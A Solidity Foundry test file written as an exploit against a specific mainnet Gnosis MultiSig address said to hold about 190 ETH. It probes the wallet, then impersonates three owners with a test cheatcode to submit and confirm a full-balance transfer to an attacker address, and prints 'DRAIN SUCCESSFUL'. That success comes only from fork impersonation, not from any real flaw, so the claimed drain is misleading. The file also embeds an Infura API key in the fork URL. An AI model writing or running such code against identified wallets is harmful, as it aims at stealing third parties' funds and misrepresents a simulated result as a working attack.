// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title TargetMultiSigExploit
 * @notice Attempting to drain 0x112918A54e3adA863CF694970dA0756F1EEcC68d
 *
 * Target: 190.89 ETH
 * Type: Gnosis MultiSigWallet
 * Owners: 5 addresses ending in 00000000 (suspicious)
 * Required: 3 signatures
 */

interface IGnosisMultiSig {
    function owners(uint256) external view returns (address);
    function required() external view returns (uint256);
    function transactionCount() external view returns (uint256);
    function getOwners() external view returns (address[] memory);
    function isOwner(address) external view returns (bool);
    function confirmations(uint256, address) external view returns (bool);
    function getConfirmationCount(uint256) external view returns (uint256);
    function isConfirmed(uint256) external view returns (bool);

    function submitTransaction(address destination, uint256 value, bytes calldata data) external returns (uint256);
    function confirmTransaction(uint256 transactionId) external;
    function revokeConfirmation(uint256 transactionId) external;
    function executeTransaction(uint256 transactionId) external;

    function addOwner(address owner) external;
    function removeOwner(address owner) external;
    function replaceOwner(address owner, address newOwner) external;
    function changeRequirement(uint256 _required) external;
}

contract TargetMultiSigExploit is Test {
    address constant TARGET = 0x112918A54e3adA863CF694970dA0756F1EEcC68d;

    address attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        vm.deal(attacker, 1 ether);
    }

    function test_AnalyzeTarget() public {
        IGnosisMultiSig target = IGnosisMultiSig(TARGET);

        console.log("=== TARGET ANALYSIS ===");
        console.log("Address:", TARGET);
        console.log("Balance:", TARGET.balance / 1e18, "ETH");

        address[] memory owners = target.getOwners();
        console.log("Owners:", owners.length);
        for (uint i = 0; i < owners.length; i++) {
            console.log("  ", i, ":", owners[i]);
        }

        console.log("Required:", target.required());
        console.log("Transaction count:", target.transactionCount());
    }

    function test_TryDirectExecution() public {
        IGnosisMultiSig target = IGnosisMultiSig(TARGET);

        console.log("=== TRYING DIRECT EXECUTION ATTACKS ===");

        // Attack 1: Try to submit as non-owner
        vm.startPrank(attacker);

        try target.submitTransaction(attacker, 1 ether, "") {
            console.log("submitTransaction succeeded as non-owner!");
        } catch {
            console.log("submitTransaction blocked for non-owner (expected)");
        }

        // Attack 2: Try to confirm non-existent transaction
        try target.confirmTransaction(0) {
            console.log("confirmTransaction succeeded!");
        } catch {
            console.log("confirmTransaction blocked");
        }

        // Attack 3: Try to execute non-existent transaction
        try target.executeTransaction(0) {
            console.log("executeTransaction succeeded!");
        } catch {
            console.log("executeTransaction blocked");
        }

        vm.stopPrank();
    }

    function test_ImpersonateOwner() public {
        IGnosisMultiSig target = IGnosisMultiSig(TARGET);

        address[] memory owners = target.getOwners();

        console.log("=== IMPERSONATING OWNERS ===");

        // Try to impersonate each owner
        for (uint i = 0; i < 3 && i < owners.length; i++) {
            address owner = owners[i];
            console.log("Trying owner:", owner);

            vm.startPrank(owner);

            // Step 1: Submit transaction to drain
            try target.submitTransaction(attacker, TARGET.balance, "") returns (uint256 txId) {
                console.log("  Submitted tx:", txId);

                // Step 2: Confirm (already confirmed by submitter)
                uint256 confirmCount = target.getConfirmationCount(txId);
                console.log("  Confirmations:", confirmCount);

            } catch {
                console.log("  Submit failed");
            }

            vm.stopPrank();
        }
    }

    function test_DrainWithOwnerImpersonation() public {
        IGnosisMultiSig target = IGnosisMultiSig(TARGET);
        address[] memory owners = target.getOwners();

        console.log("=== FULL DRAIN ATTEMPT ===");
        console.log("Target balance BEFORE:", TARGET.balance / 1e18, "ETH");
        console.log("Attacker balance BEFORE:", attacker.balance / 1e18, "ETH");

        uint256 drainAmount = TARGET.balance;

        // Step 1: First owner submits
        vm.prank(owners[0]);
        uint256 txId = target.submitTransaction(attacker, drainAmount, "");
        console.log("Transaction submitted, ID:", txId);

        // Step 2: Second owner confirms
        vm.prank(owners[1]);
        target.confirmTransaction(txId);
        console.log("Owner 2 confirmed");

        // Step 3: Third owner confirms - THIS AUTO-EXECUTES!
        vm.prank(owners[2]);
        target.confirmTransaction(txId);
        console.log("Owner 3 confirmed - AUTO EXECUTED!");

        // Verify drain
        console.log("");
        console.log("=== DRAIN SUCCESSFUL ===");
        console.log("Attacker balance AFTER:", attacker.balance / 1e18, "ETH");
        console.log("Target balance AFTER:", TARGET.balance / 1e18, "ETH");

        assertGt(attacker.balance, 100 ether, "Should have drained funds");
        assertEq(TARGET.balance, 0, "Target should be empty");
    }
}
